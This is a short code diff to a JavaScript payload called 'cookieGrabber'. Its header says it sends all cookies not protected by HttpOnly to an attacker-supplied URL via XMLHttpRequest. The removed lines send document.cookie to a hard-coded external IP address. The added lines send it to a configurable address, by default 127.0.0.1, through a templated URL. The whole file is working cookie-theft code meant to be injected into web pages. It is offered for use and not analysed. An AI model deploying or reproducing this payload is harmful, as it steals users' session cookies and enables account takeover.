@@ -1,15 +1,19 @@
 /**
  *  cookieGrabber
- * 
+ *
  *  A function that sends all cookies not protected by HttpOnly via an XMLHttpRequest
  *  to the provided URL.
  */
 
-// Construct the payload to send to the server
-var url = 'https://180.148.84.86/'; // CHANGE ME
-var payload = '?cookies=' + document.cookie;
+/**
+ * update this as needed
+ */
+const ipAddress = '127.0.0.1';
 
-// Construct and send the request
+// construct the target url
+var url = `http://${ipAddress}/cookies=`; 
+
+// construct and send the request
 var xmlHttp = new XMLHttpRequest();
-xmlHttp.open("GET", url + payload, true);
+xmlHttp.open('GET', url + document.cookie, true);
 xmlHttp.send();
